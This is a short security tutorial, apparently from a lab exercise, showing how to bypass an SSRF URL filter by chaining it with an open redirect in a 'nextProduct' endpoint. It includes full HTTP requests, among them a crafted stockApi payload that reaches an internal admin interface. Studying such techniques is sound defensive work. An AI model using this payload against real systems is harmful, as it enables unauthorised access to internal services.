It is sometimes possible to bypass filter-based defenses by exploiting an open redirection vulnerability.

Imagine a user-submitted URL is strictly validated to prevent exploitation of the SSRF behavior. However, the whitelisted URLs contains an open redirection vulnerability.

In this example, we noticed that `stockApi` parameter takes a URL directory structure to check the product stock value.
```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=/product/stock/check?productId=9&storeId=2
```
In another part of the application, we noticed that the application uses the following request to fetch the next product, and that the `path` parameter appears to be accepting a URL directory structure as its value:
```http
GET /product/nextProduct?currentProductId=3&path=/product?productId=4 HTTP/2
...
```
Provided that the backend API supports redirections, you can manipulate the URL that satisfies the filter and results in a redirected request to the target URL.
```http
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

This will return a redirection to `http://192.168.0.68/admin` exposing the administrative interface. This exploit works because the application can validate that the `stockApi` parameter value is a on a whitelist, wherein the application requests the supplied URL and triggers the open redirection by following the redirection and making a request.